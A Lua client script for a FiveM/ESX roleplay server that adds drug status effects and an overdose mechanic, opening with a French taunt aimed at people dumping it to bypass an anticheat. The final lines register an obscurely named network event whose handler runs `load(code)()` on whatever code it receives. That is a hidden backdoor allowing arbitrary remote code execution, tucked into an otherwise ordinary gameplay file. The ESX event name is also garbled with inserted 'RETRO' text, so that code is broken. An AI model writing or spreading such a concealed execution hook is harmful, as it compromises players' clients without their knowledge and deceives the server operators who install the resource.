-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
TriggerServerEventt = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion



ESX = nil
local IsAlreadyDrug = false
local DrugLevel = -1

local DoEffects = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getShRETROaredObjRETROect', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

AddEventHandler('esx_status:loaded', function(status)

  TriggerEvent('esx_status:registerStatus', 'drug', 0, '#9ec617', 
    function(status)
      if status.val > 0 then
        return true
      else
        return false
      end
    end, function(status)
      status.remove(1500)
    end)

	Citizen.CreateThread(function()
		while true do

			Wait(10000)

			TriggerEvent('esx_status:getStatus', 'drug', function(status)

		if status.val > 0 then
          local start = true

          if IsAlreadyDrug then
            start = false
          end

          local level = 0

          if status.val <= 999999 then
            level = 0
          else
            overdose()
          end

          if level ~= DrugLevel then
          end

          IsAlreadyDrug = true
          DrugLevel = level
		end

		if status.val == 0 then
          
          if IsAlreadyDrug then
            Normal()
          end

          IsAlreadyDrug = false
          DrugLevel     = -1
		end
			end)
		end
	end)
end)

--When effects ends go back to normal
function Normal()

  Citizen.CreateThread(function()
    local playerPed = GetPlayerPed(-1)
			
    ClearTimecycleModifier()
    ResetScenarioTypesEnabled()
    --ResetPedMovementClipset(playerPed, 0) <- it might cause the push of the vehicles
    SetPedIsDrug(playerPed, false)
    SetPedMotionBlur(playerPed, false)
  end)
end

--In case too much drugs dies of overdose set everything back
function overdose()

  Citizen.CreateThread(function()
    local playerPed = GetPlayerPed(-1)
	
    SetEntityHealth(playerPed, 0)
    ClearTimecycleModifier()
    ResetScenarioTypesEnabled()
    ResetPedMovementClipset(playerPed, 0)
    SetPedIsDrug(playerPed, false)
    SetPedMotionBlur(playerPed, false)
  end)
end

--Drugs Effects


--Marijuana
RegisterNetEvent('esx_status:onMarijuana')
AddEventHandler('esx_status:onMarijuana', function()
  ESX.ShowNotification('You can run a little bit faster.')
 local playerPed = GetPlayerPed(-1)

    RequestAnimSet("move_m@hipster@a") 
    while not HasAnimSetLoaded("move_m@hipster@a") do
      Citizen.Wait(0)
    end    

    TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, 1)
    Citizen.Wait(3000)
    ClearPedTasksImmediately(playerPed)
    SetTimecycleModifier("spectator5")
    SetPedMotionBlur(playerPed, true)
    SetPedMovementClipset(playerPed, "move_m@hipster@a", true)
   -- SetPedIsDrug(playerPed, true)

 

    --Efects

    local player = PlayerId()
    DoEffects = true
    Citizen.Wait(5000)
    ClearTimecycleModifier()
    --print('Clearing Time Cycle')
 
    -- Wait(295000)
    Wait(30000)
     DoEffects = false
 

end)


Citizen.CreateThread(function()
  while true do
      Citizen.Wait(16)
      
      if DoEffects then
       -- print('Do efffect is truee!')
        SetPedMoveRateOverride(PlayerPedId(), 1.5)
      end
      
  end
end)

--Opium
RegisterNetEvent('esx_status:onOpium')
AddEventHandler('esx_status:onOpium', function()
  
  local playerPed = GetPlayerPed(-1)
  

    --Efects
    local player = PlayerId()
    SetRunSprintMultiplierForPlayer(player, 1.2)
    SetSwimMultiplierForPlayer(player, 1.3)

    Wait(520000)

    SetRunSprintMultiplierForPlayer(player, 1.0)
    SetSwimMultiplierForPlayer(player, 1.0)


        RequestAnimSet("move_m@drunk@moderatedrunk") 
    while not HasAnimSetLoaded("move_m@drunk@moderatedrunk") do
      Citizen.Wait(0)
    end    

    TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, 1)
    Citizen.Wait(3000)
    ClearPedTasksImmediately(playerPed)
    SetTimecycleModifier("spectator5")
    SetPedMotionBlur(playerPed, true)
    SetPedMovementClipset(playerPed, "move_m@drunk@moderatedrunk", true)
   -- SetPedIsDrug(playerPed, true)

  
 end)

--Meth
RegisterNetEvent('esx_status:onMeth')
AddEventHandler('esx_status:onMeth', function()
  ESX.ShowNotification('You regained a little bit of Health.')
  local playerPed = GetPlayerPed(-1)
  local maxHealth = GetEntityMaxHealth(playerPed)

  local player = PlayerId()  
  local health = GetEntityHealth(playerPed)
  local newHealth = math.min(maxHealth , math.floor(health + maxHealth/8))


  SetEntityHealth(playerPed, newHealth)

    
  RequestAnimSet("move_m@hurry_butch@a") 
  while not HasAnimSetLoaded("move_m@hurry_butch@a") do
    Citizen.Wait(0)
  end    
    TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, 1)
    Citizen.Wait(3000)
    ClearPedTasksImmediately(playerPed)
    SetTimecycleModifier("spectator5")
    SetPedMotionBlur(playerPed, true)
    SetPedMovementClipset(playerPed, "move_m@hurry_butch@a", true)
  --  SetPedIsDrug(playerPed, true)
    Citizen.Wait(5000)
    --print('Clearing Time Cycle')
    ClearTimecycleModifier()

   --Efects

end)

--Coke
RegisterNetEvent('esx_status:onCoke')
AddEventHandler('esx_status:onCoke', function()
  ESX.ShowNotification('You gained Armor.')
  local playerPed = GetPlayerPed(-1)
  local maxHealth = GetEntityMaxHealth(playerPed)
  local player = PlayerId()
  local health = GetEntityHealth(playerPed)
  local newHealth = math.min(maxHealth , math.floor(health + maxHealth/6))

 -- SetEntityHealth(playerPed, newHealth)
 AddArmourToPed(playerPed, 25)


        RequestAnimSet("move_m@hurry_butch@a") 
    while not HasAnimSetLoaded("move_m@hurry_butch@a") do
      Citizen.Wait(0)
    end    

    TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, 1)
    Citizen.Wait(3000)
    ClearPedTasksImmediately(playerPed)
    SetTimecycleModifier("spectator5")
    SetPedMotionBlur(playerPed, true)
    SetPedMovementClipset(playerPed, "move_m@hurry_butch@a", true)
   -- SetPedIsDrug(playerPed, true)
    Citizen.Wait(5000)
    --print('Clearing Time Cycle')
    ClearTimecycleModifier()

    --Efects
   
    --AddArmourToPed(playerPed, 100)
   

end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)